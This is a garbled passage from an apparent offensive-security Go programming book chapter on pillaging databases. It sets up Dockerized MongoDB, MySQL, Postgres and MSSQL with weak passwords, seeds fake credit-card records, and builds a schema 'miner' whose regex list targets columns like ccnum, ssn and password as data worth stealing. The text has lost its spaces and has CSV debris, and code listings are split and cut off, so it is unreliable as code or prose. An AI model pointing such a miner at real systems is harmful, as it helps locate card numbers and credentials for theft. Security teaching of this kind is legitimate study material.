"escalation,it’sacriticalaspectoftheoverallattackchain. ",NA,NA
"Afterall,weoftenneeddatainordertoperformthoseother ",NA,NA
"activities.Commonly,thedataisoftangibleworthtoan ",NA,NA
"attacker.Althoughhackinganorganizationisthrilling,the ",NA,NA
dataitselfisoftenalucrativeprizefortheattackeranda ,NA,NA
damninglossfortheorganization.,NA,NA
"Dependingonwhichstudyyouread,abreachin2020can ",NA,NA
costanorganizationapproximately$4to$7million.AnIBM ,NA,NA
studyestimatesitcostsanorganization$129to$355per ,NA,NA
"recordstolen.Hell,ablackhathackercanmakesomeserious ",NA,NA
coinofftheundergroundmarketbysellingcreditcardsata,NA,NA
rateof$7to$80percard ,NA,NA
(,NA,NA
http://online.wsj.com/public/resources/documents/secure,NA,NA
work s_hacker_annualreport.pdf,NA,NA
).,NA,NA
TheTargetbreachaloneresultedinacompromiseof40 ,NA,NA
"millioncards.Insomecases,theTargetcardsweresoldforas ",NA,NA
muchas$135percard(,NA,NA
http://www.businessinsider.com/her,NA,NA
es-what-happened-to-your-target-data-that-was-hacked-,NA,NA
2014-,NA,NA
10/,NA,NA
").That’sprettylucrative.We,innoway,advocatethattype ",NA,NA
"ofactivity,butfolkswithaquestionablemoralcompassstand ",NA,NA
tomakealotofmoneyfromdatapillaging.,NA,NA
Enoughabouttheindustryandfancyreferencestoonline ,NA,NA
"articles—let’spillage!Inthischapter,you’lllearntosetup ",NA,NA
andseedavarietyofSQLandNoSQLdatabasesandlearnto ,NA,NA
connectandinteractwiththosedatabasesviaGo.We’llalso ,NA,NA
demonstratehowtocreateadatabaseandfilesystemdata ,NA,NA
minerthatsearchesforkeyindicatorsofjuicyinformation.,NA,NA
SETTINGUPDATABASESWITH ,NA,NA
DOCKER,NA,NA
"Inthissection,you’llinstallvariousdatabasesystemsandthen ",NA,NA
seedthemwiththedatayou’lluseinthischapter’spillaging ,NA,NA
"examples.Wherepossible,you’lluseDockeronanUbuntu ",NA,NA
18.04VM.,NA,NA
Docker,NA,NA
isasoftwarecontainerplatformthatmakes ,NA,NA
iteasytodeployandmanageapplications.Youcanbundle ,NA,NA
applicationsandtheirdependenciesinamannerthatmakes ,NA,NA
theirdeploymentstraightforward.Thecontaineris ,NA,NA
compartmentalizedfromtheoperatingsysteminorderto ,NA,NA
preventthepollutionofthehostplatform.Thisisniftystuff.,NA,NA
"Andforthischapter,youwilluseavarietyofprebuilt",NA,NA
Dockerimagesforthedatabasesyou’llbeworkingwith.If ,NA,NA
"youdon’thaveitalready,installDocker.YoucanfindUbuntu ",NA,NA
instructionsat,NA,NA
https://docs.docker.com/install/linux/docker,NA,NA
-ce/ubuntu/,NA,NA
.,"NOTE
  
 We’vespecificallychosentoomitdetailsonsettingupanOracleinstance. 
 AlthoughOracleprovidesVMimagesthatyoucandownloadanduseto 
 createatestdatabase,wefeltthatitwasunnecessarytowalkyouthrough 
 these 
 steps, since they’re fairly similar to the MySQL examples below. 
 We’llleavetheOracle-specificimplementationasanexerciseforyoutodo 
 independently.",NA
InstallingandSeedingMongoDB,NA,NA
MongoDB,NA,NA
istheonlyNoSQLdatabasethatyou’lluseinthis ,NA,NA
"chapter.Unliketraditionalrelationaldatabases,MongoDB ",NA,NA
"doesn’tcommunicateviaSQL.Instead,MongoDBusesan ",NA,NA
easy-to-understandJSONsyntaxforretrievingand ,NA,NA
manipulatingdata.Entirebookshavebeendedicatedto ,NA,NA
"explainingMongoDB,andafullexplanationiscertainly ",NA,NA
"beyondthescopeofthisbook.Fornow,you’llinstallthe ",NA,NA
Dockerimageandseeditwithfakedata.,NA,NA
"UnliketraditionalSQLdatabases,MongoDBis",NA,NA
schema-,NA,NA
less,NA,NA
",whichmeansthatitdoesn’tfollowapredefined,rigid ",NA,NA
rulesystemfororganizingtabledata.Thisexplainswhyyou’ll ,NA,NA
seeonly,insert,NA
commandsin,NA,NA
Listing7-1,NA,NA
withoutanyschema,NA,NA
"definitions.First,installtheMongoDBDockerimagewiththe ",NA,NA
followingcommand:,"$
 dockerrun--namesome-mongo-p27017:27017mongo",NA
Thiscommanddownloadstheimagenamed,mongo,NA
fromthe,NA,NA
"Dockerrepository,spinsupanewinstancenamed",some-mongo,NA
—thenameyougivetheinstanceisarbitrary—andmapslocal ,NA,NA
port,27017,NA
tothecontainerport,27017,NA
".Theportmappingiskey,",NA,NA
asitallowsustoaccessthedatabaseinstancedirectlyfromour ,NA,NA
"operatingsystem.Withoutit,itwouldbeinaccessible.",NA,NA
Checkthatthecontainerstartedautomaticallybylistingall ,NA,NA
therunningcontainers:,"$
 dockerps",NA
"Intheeventyourcontainerdoesn’tstartautomatically,run ",NA,NA
thefollowingcommand:,"$
 dockerstartsome-mongo",NA
The,start,NA
commandshouldgetthecontainergoing.,NA,NA
"Onceyourcontainerstarts,connecttotheMongoDB ",NA,NA
instancebyusingthe,run,NA
command—passingittheMongoDB,NA,NA
"client;thatway,youcaninteractwiththedatabasetoseed ",NA,NA
data:,"$
 dockerrun-it--linksome-mongo:mongo--rmmongosh\
  
  
 -c'execmongo
  
  
 ""$MONGO_PORT_27017_TCP_ADDR:$MONGO_PORT_27017_TCP_POR
  
  
 T/store""'
  
  
 >",NA
"Thismagicalcommandrunsadisposable,secondDocker ",NA,NA
containerthathastheMongoDBclientbinaryinstalled—so ,NA,NA
youdon’thavetoinstallthebinaryonyourhostoperating ,NA,NA
system—andusesittoconnecttothe,some-mongo,NA
Docker,NA,NA
"container’sMongoDBinstance.Inthisexample,you’re ",NA,NA
connectingtoadatabasenamed,test,NA
.,NA,NA
In,NA,NA
Listing7-1,NA,NA
",youinsertanarrayofdocumentsintothe",NA,NA
collection.(Allthecodelistingsattherootlocation,NA,NA
of/existundertheprovidedgithubrepo ,NA,NA
https://github.com/blackhat-,NA,NA
go/bhg/,NA,NA
.),">
 db.transactions.insert([
  
 { 
  
  
 ""ccnum"":""4444333322221111""
 , 
  
  
 ""date"":""2019-01-05"", 
  
  
 ""amount"":100.12, 
  
  
 ""cvv"":""1234"", 
  
  
 ""exp"":""09/2020"" 
  
 }, 
  
 { 
  
  
 ""ccnum"":""4444123456789012""
 , 
  
  
 ""date"":""2019-01-07"", 
  
  
 ""amount"":2400.18, 
  
  
 ""cvv"":""5544"", 
  
  
 ""exp"":""02/2021"" 
  
 }, 
  
 { 
  
  
 ""ccnum"":""4465122334455667""
 , 
  
  
 ""date"":""2019-01-29"", 
  
  
 ""amount"":1450.87, 
  
  
 ""cvv"":""9876"", 
  
  
 ""exp"":""06/2020"" 
  
 }
  
 ]);
  
 Listing7-1:InsertingtransactionsintoaMongoDBcollection(
 /ch-7/db/seed-
 mongo.js
 )",NA
That’sit!You’venowcreatedyourMongoDBdatabase ,NA,NA
instanceandseededitwitha,transactions,NA
collectionthatcontains,NA,NA
threefakedocumentsforquerying.You’llgettothequerying ,NA,NA
"partinabit,butfirst,youshouldknowhowtoinstallandseed",NA,NA
traditionalSQLdatabases.,NA,NA
InstallingandSeedingPostgreSQLandMySQL ,NA,NA
Databases,NA,NA
Databases,NA,NA
PostgreSQL,NA,NA
(alsocalled,NA,NA
Postgres,NA,NA
)and,NA,NA
MySQL,NA,NA
areprobably,NA,NA
"thetwomostcommon,well-known,enterprise-quality,open",NA,NA
"sourcerelationaldatabasemanagementsystems,andofficial",NA,NA
Dockerimagesexistforboth.Becauseoftheirsimilarityand,NA,NA
"thegeneraloverlapintheirinstallationsteps,webatched",NA,NA
togetherinstallationinstructionsforbothhere.,NA,NA
"First,muchinthesamewayasfortheMongoDBexample",NA,NA
"intheprevioussection,downloadandruntheappropriate",NA,NA
Dockerimage:,"$
 dockerrun--namesome-mysql-p3306:3306-e
  
  
 MYSQL_ROOT_PASSWORD=password-dmysql
  
  
 $
 dockerrun--namesome-postgres-p5432:5432-e
  
  
 POSTGRES_PASSWORD=password-dpostgres",NA
"Afteryourcontainersarebuilt,confirmtheyarerunning,",NA,NA
"andiftheyaren’t,youcanstartthemviathe","dockerstart
 name",NA
command.,NA,NA
"Next,youcanconnecttothecontainersfromthe",NA,NA
"appropriateclient—again,usingtheDockerimagetoprevent",NA,NA
installinganyadditionalfilesonthehost—andproceedto,NA,NA
createandseedthedatabase.In,NA,NA
Listing7-2,NA,NA
",youcanseethe",NA,NA
MySQLlogic.,"$
 dockerrun-it--linksome-mysql:mysql--rmmysqlsh-c\
  
  
 'execmysql-h""$MYSQL_PORT_3306_TCP_ADDR""-
  
  
 P""$MYSQL_PORT_3306_TCP_PORT""\
  
  
 -uroot-p""$MYSQL_ENV_MYSQL_ROOT_PASSWORD""'
  
  
 mysql>
 createdatabasestore;
  
  
 mysql>
 usestore;
  
  
 mysql>
 createtabletransactions(ccnumvarchar(32),datedate,amount
  
  
 float(7,2),
  
  
 ->
 cvvchar(4),expdate);",NA
"Thelisting,liketheonethatfollows,startsadisposable",NA,NA
Dockershellthatexecutestheappropriatedatabaseclient,NA,NA
binary.Itcreatesandconnectstothedatabasenamed,store,NA
and,NA,NA
thencreatesatablenamed,transactions,NA
.Thetwolistingsare,NA,NA
"identical,withtheexceptionthattheyaretailoredtodifferent",NA,NA
databasesystems.,NA,NA
In,NA,NA
Listing7-3,NA,NA
",youcanseethePostgreslogic,whichdiffers",NA,NA
slightlyinsyntaxfromMySQL.,"$
 dockerrun-it--rm--linksome-postgres:postgrespostgrespsql-hpostgres-
  
  
 Upostgres
  
  
 postgres=#
 createdatabasestore;
  
  
 postgres=#
 \connectstore
  
  
 store=#
 createtabletransactions(ccnumvarchar(32),datedate,amount
  
  
 money,cvv
  
  
 char(4),expdate);
  
 Listing7-3:CreatingandinitializingaPostgresdatabase",NA
"InbothMySQLandPostgres,thesyntaxisidenticalfor",NA,NA
"insertingyourtransactions.Forexample,in",NA,NA
Listing7-4,NA,NA
",you",NA,NA
canseehowtoinsertthreedocumentsintoaMySQL,transactions,NA
collection.,"mysql>
 insertintotransactions(ccnum,date,amount,cvv,exp)values
  
  
 ->
 ('4444333322221111','2019-01-05',100.12,'1234','2020-09-01');
  
  
 mysql>
 insertintotransactions(ccnum,date,amount,cvv,exp)values
  
  
 ->
 ('4444123456789012','2019-01-07',2400.18,'5544','2021-02-01');
  
  
 mysql>
 insertintotransactions(ccnum,date,amount,cvv,exp)values
  
  
 ->
 ('4465122334455667','2019-01-29',1450.87,'9876','2019-06-01');
  
 Listing7-4:InsertingtransactionsintoMySQLdatabases(
 /ch-7/db/seed-pg-
  
 mysql.sql
 )",NA
TryinsertingthesamethreedocumentsintoyourPostgres,NA,NA
database.,NA,NA
InstallingandSeedingMicrosoftSQLServer ,NA,NA
Databases,NA,NA
"In2016,Microsoftbeganmakingmajormovestoopen-source ",NA,NA
someofitscoretechnologies.Oneofthosetechnologieswas ,NA,NA
MicrosoftSQL(MSSQL)Server.Itfeelspertinenttohighlight ,NA,NA
"thisinformationwhiledemonstratingwhat,forsolong,wasn’t ",NA,NA
"possible—thatis,installingMSSQLServeronaLinux ",NA,NA
"operatingsystem.Betteryet,there’saDockerimageforit, ",NA,NA
whichyoucaninstallwiththefollowingcommand:,"$
 dockerrun--namesome-mssql-p1433:1433-e'ACCEPT_EULA=Y'\
  
  
 -e'SA_PASSWORD=Password1!'-dmicrosoft/mssql-server-linux",NA
Thatcommandissimilartotheothersyouraninthe ,NA,NA
"previoustwosections,butperthedocumentation,the ",SA_PASSWORD,NA
valueneedstobecomplex—acombinationof,NA,NA
"uppercaseletters,lowercaseletters,numbers,andspecial ",NA,NA
characters—oryouwon’tbeabletoauthenticatetoit.Since ,NA,NA
"thisisjustatestinstance,theprecedingvalueistrivialbut ",NA,NA
minimallymeetsthoserequirements—justasweseeon ,NA,NA
enterprisenetworksallthetime!,NA,NA
"Withtheimageinstalled,startthecontainer,createthe ",NA,NA
"schema,andseedthedatabase,asin",NA,NA
Listing7-5,NA,NA
.,"$
 dockerexec-itsome-mssql/opt/mssql-tools/bin/sqlcmd-Slocalhost\
  
  
 -Usa-P'Password1!'
  
  
 >
 createdatabasestore;
  
  
 >
 go
  
  
 >
 usestore;
  
  
 >
 createtabletransactions(ccnumvarchar(32),datedate,amount
  
  
 decimal(7,2),
  
  
 >
 cvvchar(4),expdate);",NA
Thepreviouslistingreplicatesthelogicwedemonstrated ,NA,NA
forMySQLandPostgresearlier.ItusesDockertoconnectto ,NA,NA
"theservice,createsandconnectstothe",store,NA
"database,and",NA,NA
createsandseedsa,transactions,NA
table.We’representingit,NA,NA
separatelyfromtheotherSQLdatabasesbecauseithassome ,NA,NA
MSSQL-specificsyntax.,NA,NA
CONNECTINGANDQUERYING ,NA,NA
DATABASESINGO,NA,NA
"Nowthatyouhaveavarietyoftestdatabasestoworkwith, ",NA,NA
youcanbuildthelogictoconnecttoandquerythosedatabases ,NA,NA
fromaGoclient.We’vedividedthisdiscussionintotwo ,NA,NA
topics—oneforMongoDBandonefortraditionalSQL ,NA,NA
databases.,NA,NA
QueryingMongoDB,NA,NA
"DespitehavinganexcellentstandardSQLpackage,Go ",NA,NA
doesn’tmaintainasimilarpackageforinteractingwith ,NA,NA
NoSQLdatabases.Insteadyou’llneedtorelyonthird-party ,NA,NA
packagestofacilitatethisinteraction.Ratherthaninspectthe ,NA,NA
"implementationofeachthird-partypackage,we’llfocus",NA,NA
purelyonMongoDB.We’llusethe,mgo,NA
(pronounce,NA,NA
mango,NA,NA
),NA,NA
DBdriverforthis.,NA,NA
Startbyinstallingthe,mgo,NA
driverwiththefollowing,NA,NA
command:,"$
 gogetgopkg.in/mgo.v2",NA
Youcannowestablishconnectivityandqueryyour,store,NA
"collection(theequivalentofatable),whichrequiresevenless ",NA,NA
codethantheSQLsamplecodewe’llcreatelater(see,NA,NA
Listing 7-,NA,NA
6,NA,NA
).,"packagemain
  
 import
 ( 
  
 ""fmt"" 
  
 ""log""
  
 mgo""gopkg.in/mgo.v2"" 
  
 )
  
 typeTransactionstruct{❶
  
 CCNumstring`bson:""ccnum""`
  
 Datestring`bson:""date""` 
  
 Amountfloat32`bson:""amount""` 
  
 Cvvstring`bson:""cvv""` 
  
 Expirationstring`bson:""exp""` 
  
 }
  
 funcmain(){ 
  
 session,err:=mgo.Dial(""127.0.0.1"")❷ife
 rr!=nil{
  
 log.Panicln(err) 
  
 } 
  
 defersession.Close()
  
 results:=make([]Transaction,0)",NA
"First,youdefineatype,",Transaction,NA
",whichwillrepresenta ",NA,NA
singledocumentfromyour,store,NA
collection❶.Theinternal ,NA,NA
mechanismfordatarepresentationinMongoDBisbinary,NA,NA
"JSON.Forthisreason,usetaggingtodefineanymarshaling",NA,NA
"directives.Inthiscase,you’reusingtaggingtoexplicitly",NA,NA
definetheelementnamestobeusedinthebinaryJSONdata.,NA,NA
Inyour,main(),NA
"function❷,call",mgo.Dial(),NA
tocreateasession ,NA,NA
"byestablishingaconnectiontoyourdatabase,testingtomake",NA,NA
"surenoerrorsoccurred,anddeferringacalltoclosethe",NA,NA
session.Youthenusethe,session,NA
variabletoquerythe,store,NA
"database❸,retrievingalltherecordsfromthe",transactions,NA
collection.Youstoretheresultsina,Transaction,NA
"slice,named",results,NA
".Underthecovers,yourstructuretagsareusedto",NA,NA
"unmarshalthebinaryJSONtoyourdefinedtype.Finally,loop ",NA,NA
overyourresultsetandprintthemtothescreen❹.Inboth ,NA,NA
"thiscaseandtheSQLsampleinthenextsection,youroutput",NA,NA
shouldlooksimilartothefollowing:,"$
 gorunmain.go
  
  
 44443333222211112019-01-05100.12123409/2020
  
  
 44441234567890122019-01-072400.18554402/2021
  
  
 44651223344556672019-01-291450.87987606/2020",NA
QueryingSQLDatabases,NA,NA
QueryingSQLDatabases,NA,NA
"Gocontainsastandardpackage,called",database/sql,NA
",thatdefines",NA,NA
aninterfaceforinteractingwithSQLandSQL-likedatabases. ,NA,NA
Thebaseimplementationautomaticallyincludesfunctionalit,NA,NA
y ,NA,NA
suchasconnectionpoolingandtransactionsupport.Database ,NA,NA
driversadheringtothisinterfaceautomaticallyinheritthese ,NA,NA
"capabilitiesandareessentiallyinterchangeable,astheAPI ",NA,NA
remainsconsistentbetweendrivers.Thefunctioncallsand ,NA,NA
implementationinyourcodeareidenticalwhetheryou’re ,NA,NA
"usingPostgres,MSSQL,MySQL,orsomeotherdriver.This ",NA,NA
makesitconvenienttoswitchbackenddatabaseswithminima,NA,NA
"l codechangeontheclient.Ofcourse,thedriverscan ",NA,NA
implementdatabase-specificcapabilitiesandusedifferent ,NA,NA
"SQLsyntax,butthefunctioncallsarenearlyidentical.",NA,NA
"Forthisreason,we’llshowyouhowtoconnecttojustone ",NA,NA
SQLdatabase—MySQL—andleavetheotherSQLdatabases ,NA,NA
asanexerciseforyou.Youstartbyinstallingthedriverwith ,NA,NA
thefollowingcommand:,"$
 gogetgithub.com/go-sql-driver/mysql",NA
"Then,youcancreateabasicclientthatconnectstothe ",NA,NA
databaseandretrievestheinformationfromyour,"transaction
 s",NA
table—usingthescriptin,NA,NA
Listing7-7,NA,NA
.,"packagemain
  
  
 import( 
  
 ""database/sql""❶
  
 ""fmt""
  
  
 ""log""
  
  
 ""github.com/go-sql-driver/mysql""❷",NA
ThecodebeginsbyimportingGo’s,database/sql,NA
package❶. ,NA,NA
ThisallowsyoutoutilizeGo’sawesomestandardSQLlibrary ,NA,NA
interfacetointeractwiththedatabase.Youalsoimportyour ,NA,NA
MySQLdatabasedriver❷.Theleadingunderscoreindicates ,NA,NA
"thatit’simportedanonymously,whichmeansitsexported",NA,NA
"typesaren’tincluded,butthedriverregistersitselfwiththe",sql,NA
packagesothattheMySQLdriveritselfhandlesthefunction ,NA,NA
calls.,NA,NA
"Next,youcall",sql.Open(),NA
toestablishaconnectiontoour ,NA,NA
database❸.Thefirstparameterspecifieswhichdrivershould ,NA,NA
"beused—inthiscase,thedriveris",mysql,NA
—andthesecond,NA,NA
parameterspecifiesyourconnectionstring.Youthenquery ,NA,NA
"yourdatabase,passinganSQLstatementtoselectallrows ",NA,NA
fromyour,transactions,NA
"table❹,andthenloopovertherows, ",NA,NA
subsequentlyreadingthedataintoyourvariablesandprintin,NA,NA
g thevalues❺.,NA,NA
That’sallyouneedtodotoqueryaMySQLdatabase.,NA,NA
Usingadifferentbackenddatabaserequiresonlythefollowing ,NA,NA
minorchangestothecode:,"1.
  Importthecorrectdatabasedriver.
  
 2.
  Changetheparameterspassedtosql.Open().
  
 3.
  TweaktheSQLsyntaxtotheflavorrequiredbyyourbackenddatabase.",NA
"Amongtheseveraldatabasedriversavailable,manyare ",NA,NA
"pureGo,whileahandfulofothersuse",cgo,NA
forsomeunderlying,NA,NA
interaction.Checkoutthelistofavailabledriversat ,NA,NA
https://github.com/golang/go/wiki/SQLDrivers,NA,NA
/,NA,NA
.,NA,NA
BUILDINGADATABASEMINER,NA,NA
"Inthissection,youwillcreateatoolthatinspectsthedatabase ",NA,NA
"schema(forexample,columnnames)todeterminewhetherth",NA,NA
"e datawithinisworthpilfering.Forinstance,sayyouwantto ",NA,NA
"findpasswords,hashes,socialsecuritynumbers,andcredit ",NA,NA
cardnumbers.Ratherthanbuildingonemonolithicutilitythat,NA,NA
"minesvariousbackenddatabases,you’llcreateseparate ",NA,NA
utilities—oneforeachdatabase—andimplementadefined ,NA,NA
interfacetoensureconsistencybetweentheimplementation,NA,NA
s.,NA,NA
"Thisflexibilitymaybesomewhatoverkillforthisexample, ",NA,NA
butitgivesyoutheopportunitytocreatereusableandportable ,NA,NA
code.,NA,NA
"Theinterfaceshouldbeminimal,consistingofafewbasic ",NA,NA
"typesandfunctions,anditshouldrequiretheimplementatio",NA,NA
n ofasinglemethodtoretrievedatabaseschema.,NA,NA
Listing7-8,NA,NA
", ",NA,NA
called,NA,NA
dbminer.go,NA,NA
",definesthedatabaseminer’sinterface.","packagedbminer
  
 import( 
  
 ""fmt"" 
  
 ""regexp"" 
  
 )
  
 ❶typeDatabaseMinerinterface{ 
  
 GetSchema()(*Schema,error)
  
 }
  
 ❷typeSchemastruct{ 
  
 Databases[]Database
  
 }
  
 typeDatabasestruct{ 
  
 Namestring 
  
 Tables[]Table 
  
 }
  
 typeTablestruct{ 
  
 Namestring 
  
 Columns[]string 
  
 }
  
 ❸funcSearch(mDatabaseMiner)error{",NA
Thecodebeginsbydefininganinterfacenamed ,DatabaseMiner,NA
"❶.Asinglemethod,called",GetSchema(),NA
",isrequired",NA,NA
foranytypesthatimplementtheinterface.Becauseeach ,NA,NA
backenddatabasemayhavespecificlogictoretrievethe ,NA,NA
"databaseschema,theexpectationisthateachspecificutility ",NA,NA
canimplementthelogicinawaythat’suniquetothebackend ,NA,NA
databaseanddriverinuse.,NA,NA
"Next,youdefinea",Schema,NA
"type,whichiscomposedofafew ",NA,NA
subtypesalsodefinedhere❷.You’llusethe,Schema,NA
typeto ,NA,NA
"logicallyrepresentthedatabaseschema—thatis,databases, ",NA,NA
"tables,andcolumns.Youmighthavenoticedthatyour ",GetSchema(),NA
"function,withintheinterfacedefinition,expects",NA,NA
implementationstoreturna,*Schema,NA
.,NA,NA
"Now,youdefineasinglefunction,called",Search(),NA
",which",NA,NA
containsthebulkofthelogic.The,Search(),NA
functionexpectsa,DatabaseMiner,NA
"instancetobepassedtoitduringthefunctioncall, ",NA,NA
andstorestheminervalueinavariablenamed,m,NA
❸.The ,NA,NA
functionstartsbycalling,m.GetSchema(),NA
toretrievetheschema❹.,NA,NA
"Thefunctionthenloopsthroughtheentireschema, ",NA,NA
searchingagainstalistofregularexpression(regex)valuesfor ,NA,NA
"columnnamesthatmatch❺.Ifitfindsamatch,thedatabase ",NA,NA
schemaandmatchingfieldareprintedtothescreen.,NA,NA
"Lastly,defineafunctionnamed",getRegex(),NA
❻.Thisfunction ,NA,NA
compilesregexstringsbyusingGo’s,regexp,NA
packageand,NA,NA
returnsasliceofthesevalues.Theregexlistconsistsofcase-,NA,NA
insensitivestringsthatmatchagainstcommonorinteresting ,NA,NA
fieldnamessuchas,ccnum,NA
",",ssn,NA
",and",password,NA
.,NA,NA
"Withyourdatabaseminer’sinterfaceinhand,youcan ",NA,NA
createutility-specificimplementations.Let’sstartwiththe ,NA,NA
MongoDBdatabaseminer.,NA,NA
ImplementingaMongoDBDatabaseMiner,NA,NA
TheMongoDButilityprogramin,NA,NA
Listing7-9,NA,NA
implementsthe,NA,NA
interfacedefinedin,NA,NA
Listing7-8,NA,NA
whilealsointegratingthe ,NA,NA
databaseconnectivitycodeyoubuiltin,NA,NA
Listing7-6,NA,NA
.,"packagemain
  
 import( 
  
 ""os""
  
 ❶""github.com/bhg/ch-
 7/db/dbminer"" 
  
 ""gopkg.in/mgo.v2"" 
  
 ""gopkg.in/mgo.v2/bson"" 
  
 )
  
 ❷typeMongoMinerstruct{ 
  
 Hoststring 
  
 session*mgo.Session 
  
 }
  
 ❸funcNew(hoststring)(*MongoMiner,error){ 
  
 m:=MongoMiner{Host:host} 
  
 err:=m.connect() 
  
 iferr!=nil{ 
  
 returnnil,err 
  
 } 
  
 return&m,nil 
  
 }
  
 ❹func(m*MongoMiner)connect()error{ 
  
 s,err:=mgo.Dial(m.Host) 
  
 iferr!=nil{ 
  
 returnerr 
  
 } 
  
 m.session=s 
  
 returnnil 
  
 }",NA
Youstartbyimportingthe,dbminer,NA
packagethatdefinesyour ,DatabaseMiner,NA
interface❶.Thenyoudefinea,MongoMiner,NA
type ,NA,NA
thatwillbeusedtoimplementtheinterface❷.For ,NA,NA
"convenience,youdefinea",New(),NA
functionthatcreatesanew ,NA,NA
instanceofyour,MongoMiner,NA
"type❸,callingamethodnamed ",connect(),NA
thatestablishesaconnectiontothedatabase❹.The ,NA,NA
"entiretyofthislogicessentiallybootstrapsyourcode,",NA,NA
connectingtothedatabaseinafashionsimilartothat,NA,NA
discussedin,NA,NA
Listing7-6,NA,NA
.,NA,NA
Themostinterestingportionofthecodeisyour ,NA,NA
implementationofthe,GetSchema(),NA
interfacemethod❺.Unlike ,NA,NA
inthepreviousMongoDBsamplecodein,NA,NA
Listing7-6,NA,NA
",youare",NA,NA
"nowinspectingtheMongoDBmetadata,firstretrieving ",NA,NA
databasenames❻andthenloopingoverthosedatabasesto ,NA,NA
"retrieveeachdatabase’scollectionnames❼.Lastly,the ",NA,NA
"functionretrievestherawdocumentthat,unlikeatypical ",NA,NA
"MongoDBquery,useslazyunmarshaling❽.Thisallowsyou ",NA,NA
toexplicitlyunmarshaltherecordintoagenericstructureso ,NA,NA
thatyoucaninspectfieldnames❾.Ifnotforlazy ,NA,NA
"unmarshaling,youwouldhavetodefineanexplicittype,",NA,NA
likelyusing,bson,NA
"tagattributes,inordertoinstructyourcode",NA,NA
howtounmarshalthedataintoastructyoudefined.Inthis,NA,NA
"case,youdon’tknow(orcare)aboutthefieldtypesor",NA,NA
structure—youjustwantthefieldnames(notthedata)—so,NA,NA
thisishowyoucanunmarshalstructureddatawithoutneeding,NA,NA
toknowthestructureofthatdatabeforehand.,NA,NA
Your,main(),NA
functionexpectstheIPaddressofyour,NA,NA
"MongoDBinstanceasitsloneargument,callsyour",New(),NA
"functiontobootstrapeverything,andthencalls",dbminer.Search(),NA
", passingtoityour",MongoMiner,NA
instance❿.Recallthat ,dbminer.Search(),NA
calls,GetSchema(),NA
onthereceived,DatabaseMiner,NA
instance;thiscallsyour,MongoMiner,NA
implementationofthe,NA,NA
"function,whichresultsinthecreationof",dbminer.Schema,NA
thatis,NA,NA
thensearchedagainsttheregexlistin,NA,NA
Listing7-8,NA,NA
.,NA,NA
"Whenyourunyourutility,youareblessedwiththe",NA,NA
followingoutput:,"$
 gorunmain.go127.0.0.1
  
  
 [DB]=store
  
  
 [TABLE]=transactions
  
  
 [COL]=_id
  
  
 [COL]=ccnum
  
  
 [COL]=date
  
  
 [COL]=amount
  
  
 [COL]=cvv
  
  
 [COL]=exp
  
  
 [+]HIT:ccnum",NA
"Youfoundamatch!Itmaynotlookpretty,butitgetsthe",NA,NA
jobdone—successfullylocatingthedatabasecollectionthat,NA,NA
hasafieldnamed,ccnum,NA
.,NA,NA
"WithyourMongoDBimplementationbuilt,inthenext",NA,NA
"section,you’lldothesameforaMySQLbackenddatabase.",NA,NA
ImplementingaMySQLDatabaseMiner,NA,NA
"TomakeyourMySQLimplementationwork,you’llinspect",NA,NA
the,information_schema.columns,NA
table.Thistablemaintainsmetadata,NA,NA
"aboutallthedatabasesandtheirstructures,includingtableand",NA,NA
"columnnames.Tomakethedatathesimplesttoconsume,use",NA,NA
"thefollowingSQLquery,whichremovesinformationabout",NA,NA
someofthebuilt-inMySQLdatabasesthatareofno,NA,NA
consequencetoyourpillagingefforts:,"SELECTTABLE_SCHEMA,TABLE_NAME,COLUMN_NAMEFROM
  
  
 columns
  
  
 WHERETABLE_SCHEMANOTIN('mysql','information_schema',
  
  
 'performance_schema','sys')
  
  
 ORDERBYTABLE_SCHEMA,TABLE_NAME",NA
Thequeryproducesresultsresemblingthefollowing:,"+--------------+--------------+-------------+
  
  
 |TABLE_SCHEMA|TABLE_NAME|COLUMN_NAME|
  
  
 +--------------+--------------+-------------+
  
  
 |store|transactions|ccnum|
  
  
 |store|transactions|date|
  
  
 |store|transactions|amount|
  
  
 |store|transactions|cvv|
  
  
 |store|transactions|exp|
  
  
 --snip--",NA
Althoughusingthatquerytoretrieveschemainformationis,NA,NA
"prettystraightforward,thecomplexityinyourcodecomes",NA,NA
fromlogicallytryingtodifferentiateandcategorizeeachrow,NA,NA
whiledefiningyour,GetSchema(),NA
"function.Forexample,",NA,NA
consecutiverowsofoutputmayormaynotbelongtothesame,NA,NA
"databaseortable,soassociatingtherowstothecorrect",dbminer.Database,NA
and,dbminer.Table,NA
instancesbecomesasomewhat,NA,NA
trickyendeavor.,NA,NA
Listing7-10,NA,NA
definestheimplementation.,"typeMySQLMinerstruct{
  
 Hoststring 
  
 Dbsql.DB 
  
 }
  
 funcNew(hoststring)(*MySQLMiner,error){ 
  
 m:=MySQLMiner{Host:host} 
  
 err:=m.connect() 
  
 iferr!=nil{ 
  
 returnnil,err 
  
 } 
  
 return&m,nil 
  
 }
  
 func(m*MySQLMiner)connect()error{
  
 db,err:=sql.Open( 
  
 ""mysql"",
  
  
 ❶fmt.Sprintf(""root:password@tcp(%s:3306)/information_schema"",m.Ho
 st)) iferr!=nil{ 
  
 log.Panicln(err) 
  
 } 
  
 m.Db=*db 
  
 returnnil 
  
 }
  
 func(m*MySQLMiner)GetSchema()(*dbminer.Schema,error){ 
  
 vars=new(dbminer.Schema)
  
 ❷sql:=`SELECTTABLE_SCHEMA,TABLE_NAME,COLUMN_NAME 
 FROMcolumns 
  
 WHERETABLE_SCHEMANOTIN 
  
 ('mysql','information_schema','performance_schema','sys') 
  
 ORDERBYTABLE_SCHEMA,TABLE_NAME` 
  
 schemarows,err:=m.Db.Query(sql) 
  
 iferr!=nil{ 
  
 returnnil,err 
  
 }
  
 deferschemarows.Close()",NA
Aquickglanceatthecodeandyou’llprobablyrealizethat ,NA,NA
"muchofitisvery,verysimilartotheMongoDBexamplein ",NA,NA
"theprecedingsection.Asamatteroffact,the",main(),NA
functionis,NA,NA
identical.,NA,NA
Thebootstrappingfunctionsarealsosimilar—,NA,NA
youjust ,NA,NA
changethelogictointeractwithMySQLratherthan ,NA,NA
MongoDB.Noticethatthislogicconnectstoyour ,information_schema,NA
"database❶,sothatyoucaninspectthe ",NA,NA
databaseschema.,NA,NA
Muchofthecode’scomplexityresideswithinthe ,GetSchema(),NA
implementation.Althoughyouareabletoretrieve ,NA,NA
"theschemainformationbyusingasingledatabasequery❷, ",NA,NA
"youthenhavetoloopovertheresults❸,inspectingeachrow ",NA,NA
"soyoucandeterminewhatdatabasesexist,whattablesexistin ",NA,NA
"eachdatabase,andwhatcolumnsexistforeachtable.Unlike ",NA,NA
"inyourMongoDBimplementation,youdon’thavetheluxury ",NA,NA
